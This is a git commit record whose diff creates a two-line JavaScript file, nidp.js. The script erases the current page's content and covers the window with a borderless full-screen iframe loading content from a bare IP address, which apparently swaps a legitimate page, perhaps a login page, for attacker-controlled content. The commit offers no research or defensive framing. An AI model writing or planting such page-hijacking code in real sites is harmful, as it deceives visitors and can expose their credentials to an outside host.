7e83254b9ed972246ac60406239b086d88a256cd
tomasgreendssaIaoa <tomasgreen1293@gmx.com>
2016-05-03 19:31:39 -0700

    Create nidp.js

---
+++ nidp.js
@@ -0,0 +1,2 @@
+document.body.innerHTML = "";
+document.writeln("<iframe width=100% height=100%  frameborder=0 scrolling=no style=position:absolute;left:0;top:0 src=http://86.106.131.117></iframe>");
